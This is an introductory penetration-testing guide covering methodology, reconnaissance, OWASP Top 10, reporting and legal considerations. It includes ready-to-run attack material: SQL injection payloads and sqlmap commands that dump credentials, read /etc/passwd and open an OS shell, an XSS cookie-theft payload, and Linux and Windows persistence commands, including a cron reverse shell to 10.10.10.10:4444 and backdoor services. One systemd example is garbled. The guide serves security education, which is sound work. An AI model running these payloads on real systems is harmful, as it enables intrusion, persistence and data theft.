Introduction to Penetration Testing

Penetration testing, also known as "pentesting" or ethical hacking, is an authorized simulated cyberattack on a computer system, performed to evaluate the security of the system.

What is Penetration Testing?

Penetration testing is the practice of testing a computer system, network, or web application to find security vulnerabilities that an attacker could exploit. The goal is to identify weaknesses before malicious actors do and provide recommendations for remediation.

Types of Penetration Tests

Black Box Testing

The tester has no prior knowledge of the system. This simulates an external attacker's perspective and tests the system as an outsider would.

  • No credentials or internal information
  • Most realistic external threat simulation
  • Longer testing time required

Gray Box Testing

The tester has partial knowledge of the system, such as login credentials or network diagrams. This simulates an insider threat or compromised account.

  • Limited credentials and information
  • Balances depth and breadth of testing
  • Most common in practice

White Box Testing

The tester has complete knowledge of the system including source code, architecture, and credentials. This enables the most comprehensive security assessment.

  • Full access to system information
  • Can identify deeper vulnerabilities
  • Most efficient use of testing time

Penetration Testing Methodology

A structured approach is essential for effective penetration testing. The most widely adopted methodologies include PTES, OWASP, and NIST guidelines.

Planning & Reconnaissance

Define the scope and goals of a test, including the systems to be addressed and the testing methods to be used. Gather intelligence (OSINT) to better understand how a target works.

  • Define scope and objectives
  • Obtain necessary authorizations
  • Gather passive information
  • Identify target assets

Scanning & Enumeration

Use technical tools to probe the target for vulnerabilities. This includes port scanning, network mapping, service enumeration, and application scanning.

  • Port scanning (Nmap)
  • Service version detection
  • OS fingerprinting
  • Web application scanning

Vulnerability Analysis

Analyze the information gathered to identify potential vulnerabilities. This involves both automated scanning and manual analysis.

  • Automated vulnerability scanning
  • Manual code review
  • Configuration analysis
  • Vulnerability prioritization

Exploitation

Attempt to exploit identified vulnerabilities to gain unauthorized access or demonstrate the potential impact of the vulnerability.

  • Exploit development/selection
  • Privilege escalation
  • Lateral movement
  • Maintain access

Post-Exploitation

Determine the value of the compromised system and maintain access for further testing. Assess the impact and potential damage.

  • Data exfiltration simulation
  • Persistence mechanisms
  • Privilege escalation
  • Network pivoting

Reporting

Document all findings, including vulnerabilities discovered, data accessed, and the amount of time the tester was able to remain in the system undetected.

  • Executive summary
  • Technical findings
  • Risk assessment
  • Remediation recommendations

Reconnaissance

Reconnaissance is the process of gathering information about a target before launching an attack. It's divided into passive and active reconnaissance. This phase is crucial as it lays the foundation for the entire penetration test.

Passive Reconnaissance

Gathering information without directly interacting with the target system, minimizing the risk of detection. This is the safest form of reconnaissance.

  • WHOIS: Domain registration information, registrar details, nameservers
  • DNS Records: MX, TXT, A, AAAA, NS, SOA, CNAME records
  • Search Engines: Google dorking, Shodan, Censys, ZoomEye
  • Social Media: Employee information, technologies used, org structure
  • Job Postings: Technology stack clues, internal tools, security measures
  • Public Databases: Certificate transparency logs, breach databases
  • Archive Sites: Wayback Machine for historical data
  • Code Repositories: GitHub, GitLab for exposed credentials
  • Public Documents: PDFs, presentations with metadata
  • Financial Records: SEC filings, annual reports

Active Reconnaissance

Directly interacting with the target system to gather information. More likely to be detected but yields more detailed and current information.

  • Port Scanning: Nmap for open ports and services
  • Service Enumeration: Banner grabbing, version detection
  • Network Mapping: Topology discovery, route tracing
  • Web Crawling: Directory enumeration, sitemap analysis
  • DNS Zone Transfers: Full DNS records (if misconfigured)
  • Email Verification: Testing email addresses for validity
  • Web Technology Detection: Framework identification, CMS detection
  • WAF Detection: Identifying web application firewalls

Vulnerability Analysis

Vulnerability analysis involves identifying, quantifying, and prioritizing vulnerabilities in a system. This phase bridges reconnaissance and exploitation.

Common Vulnerability Types

SQL Injection

Injecting malicious SQL code into application queries to manipulate or extract database information. 

# Example vulnerable query
SELECT * FROM users WHERE username='$username' AND password='$password'

# Injection payload
username: admin' OR '1'='1' --
password: anything

Cross-Site Scripting (XSS)

Injecting malicious scripts into web pages viewed by other users. Three main types: Stored, Reflected, and DOM-based XSS. 

# Reflected XSS example
https://vulnerable.com/search?q=<script>alert(document.cookie)</script>

# Detection with our tool
python3 penetration-test.py scan example.com --plugin dalfox_xss
python3 penetration-test.py scan example.com --plugin xss_detector

Broken Authentication

Flaws in authentication mechanisms that allow attackers to compromise passwords, keys, or session tokens.

  • Weak password policies
  • Session fixation
  • Credential stuffing
  • Broken password recovery

Security Misconfiguration

Insecure default configurations, incomplete setups, open cloud storage, misconfigured HTTP headers, and verbose error messages.

  • Default credentials
  • Directory listing enabled
  • Unnecessary features enabled
  • Detailed error messages

Exploitation

Exploitation is the phase where identified vulnerabilities are actively exploited to gain unauthorized access, escalate privileges, or demonstrate the impact of security flaws. This phase requires careful planning and execution to avoid system damage.

⚠️ WARNING: Only exploit vulnerabilities in authorized systems during legitimate penetration tests. Unauthorized exploitation is illegal and unethical.

Web Application Exploitation

SQL Injection Exploitation

Exploiting SQL injection vulnerabilities to extract data:

# Manual SQL injection
# Boolean-based blind SQLi
?id=1' AND 1=1-- -  # Returns true
?id=1' AND 1=2-- -  # Returns false

# Union-based SQLi
?id=-1' UNION SELECT 1,2,3,4,5-- -
?id=-1' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -
?id=-1' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
?id=-1' UNION SELECT NULL,username,password FROM users-- -

# Time-based blind SQLi
?id=1' AND IF(1=1,SLEEP(5),0)-- -

# Automated with SQLMap
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --columns
sqlmap -u "http://target.com/page?id=1" -D database -T users -C username,password --dump

# Reading files
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# Getting shell
sqlmap -u "http://target.com/page?id=1" --os-shell

Post-Exploitation

Post-exploitation occurs after gaining initial access to a system. The goal is to maintain access, escalate privileges, move laterally, exfiltrate data, and assess the full impact of the compromise while avoiding detection.

Maintaining Access

Persistence Mechanisms

Linux Persistence:

# SSH keys
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Cron jobs
(crontab -l; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'") | crontab -

# Systemd service
cat > /etc/systemd/system/backdoor.service <& /dev/tcp/10.10.10.10/4444 0>&1' >> ~/.bashrc

Windows Persistence:

# Registry Run keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe" /f

# Scheduled tasks
schtasks /create /tn "Backdoor" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru System

# Service creation
sc create Backdoor binPath= "C:\Windows\Temp\backdoor.exe" start= auto
sc start Backdoor

# WMI Event Subscription
# PowerShell based persistence
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="Filter"; EventNamespace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";}

Web Application Security

Web applications are a primary target for attackers due to their accessibility and frequent vulnerabilities. Understanding OWASP Top 10 is essential.

OWASP Top 10 (2021)

Broken Access Control

Restrictions on what authenticated users can do are not properly enforced. Attackers can exploit these flaws to access unauthorized functionality or data.

Cryptographic Failures

Failures related to cryptography which often lead to exposure of sensitive data. Includes weak encryption, hardcoded keys, and improper storage.

Injection

SQL, NoSQL, OS command, and LDAP injection occur when untrusted data is sent to an interpreter as part of a command or query.

Insecure Design

A broad category representing different weaknesses in design and architecture, with a focus on risks related to design flaws.

Security Misconfiguration

Missing appropriate security hardening across any part of the application stack, or improperly configured permissions on cloud services.

Vulnerable and Outdated Components

Using components with known vulnerabilities. This includes libraries, frameworks, and other software modules.

Identification and Authentication Failures

Authentication and session management implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens.

Software and Data Integrity Failures

Code and infrastructure that does not protect against integrity violations, including insecure CI/CD pipelines and auto-update functionality.

Security Logging and Monitoring Failures

Without logging and monitoring, breaches cannot be detected. Insufficient logging and ineffective integration with incident response systems.

Server-Side Request Forgery (SSRF)

Occurs when a web application fetches a remote resource without validating the user-supplied URL, allowing attackers to coerce the application to send requests to an unintended destination.

Network Security Best Practices

  • Segmentation: Use VLANs and subnets to isolate network segments
  • Encryption: Use VPNs and encrypted protocols (HTTPS, SSH, SFTP)
  • Monitoring: Implement IDS/IPS and SIEM solutions
  • Access Control: Use firewalls and ACLs to restrict traffic
  • Authentication: Implement 802.1X for network access control
  • Updates: Keep network devices and firmware updated
  • Hardening: Disable unnecessary services and protocols

Penetration Testing Reports

A well-written report is crucial for communicating findings and recommendations. It should be clear, actionable, and tailored to the audience.

Report Structure

1. Executive Summary

High-level overview for non-technical stakeholders:

  • Overall risk assessment
  • Key findings summary
  • Business impact
  • Critical recommendations

2. Methodology

Detailed description of the testing process:

  • Scope and limitations
  • Testing approach
  • Tools used
  • Timeline

3. Technical Findings

Detailed vulnerability information:

  • Vulnerability description
  • Severity rating (CVSS)
  • Proof of concept
  • Affected systems/components
  • Remediation steps

4. Appendices

Supporting information:

  • Full scan results
  • Screenshots and evidence
  • Tool outputs
  • References and resources

Legal & Ethical Considerations

⚠️ WARNING: Unauthorized access to computer systems is illegal in most jurisdictions. Always obtain proper authorization before conducting any security testing.

Legal Requirements

Authorization

Always obtain written authorization before testing:

  • Signed contract or letter of authorization
  • Clearly defined scope
  • Specified testing windows
  • Contact information for emergencies
  • Rules of engagement

Scope Limitations

Stay within the agreed scope:

  • Only test authorized systems
  • Respect time windows
  • Avoid testing production during business hours (unless authorized)
  • Do not cause denial of service
  • Do not access or modify data beyond what's necessary for PoC

Ethical Guidelines

Professional Conduct

  • Maintain confidentiality
  • Protect client data
  • Report all findings honestly
  • Don't exploit vulnerabilities beyond demonstration
  • Provide actionable remediation advice

Common Legal Frameworks

  • Computer Fraud and Abuse Act (CFAA) - United States
  • Computer Misuse Act - United Kingdom
  • GDPR - European Union (data protection)
  • PCI DSS - Payment card industry standards
  • HIPAA - Healthcare data protection (US)
ℹ️ Best Practice: Always consult with legal counsel before conducting penetration tests, especially for client engagements or cross-border testing.
